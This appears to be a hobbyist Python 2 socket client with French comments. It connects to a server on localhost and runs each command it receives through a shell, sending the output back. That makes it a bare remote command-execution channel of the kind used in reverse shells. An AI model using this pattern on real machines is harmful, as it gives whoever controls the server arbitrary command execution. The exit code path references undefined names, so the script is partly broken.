import subprocess
from subprocess import Popen, PIPE, STDOUT
import socket
import sys
import time
from threading import Thread

srvaddr = ('localhost', 8800)
contenu = ''
#parametre de connexion au srv pour le client

print 'Connecting to %s port %s' % srvaddr
clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
clientsocket.connect(srvaddr)
print clientsocket

def sendMessage():
    contenu = raw_input("Entrer CMD : ")
    if contenu == '':
        print "\nMessage vide, ecrivez ^^ !\n#FACEPALM\n"
        return True
    elif contenu == 'exit':
        print 'Closing socket'
        thread_2.mycurrentclient.close()
        thread_3.mycurrentwatch.close()
        return False
    else:
        clientsocket.sendall(contenu)
        print "SENDED\n"
        return True
    pass

class mytchatrecep(Thread):

        def run(self):
            while True:
                data = clientsocket.recv(255)
                #le 255 definit le nombre de caracteres envoye en une seule fois
                if data != '':
                    print '\nRecu : "%s"' % data
                    #p = Popen([data], stdin=PIPE, stdout=PIPE, bufsize=1)
                    #print p.stdout.readline(), # read the first line
                    #for i in range(10):
                        #print >>p.stdin, i
                        #p.stdin.flush()
                        #print p.stdout.readline(),
                    result = []
                    p = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE)
                    #q = Popen(data, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
                    #print p.stdout
                    for line in p.stdout:
                        #line = line.rstrip()

                        if line != '':
                            print line,
                            #la , en fin de ligne permet d'empecher le retour chariot
                            clientsocket.sendall(line,)
                            #clientsocket.sendall("EMPTY\n")
                            #print "EMPTY"
                        #else:
                            #clientsocket.sendall(line)
                            #result.append(line)
                            #print line
                    #print result
                    #print p.stdout
                    #clientsocket.sendall(''.join([line for line in p.stdout.xreadlines()]))
                    #output = p.stdout
                    #clientsocket.sendall(output)
                    #print output
                    #print action


class mytchatsend(Thread):

    def run(self):
        while True:
            sendMessage()



Thread_1 = mytchatrecep()
Thread_2 = mytchatsend()
Thread_1.start()
Thread_2.start()
Thread_1.join()
Thread_2.join()

#clientsocket.close()
#print 'Closing socket'
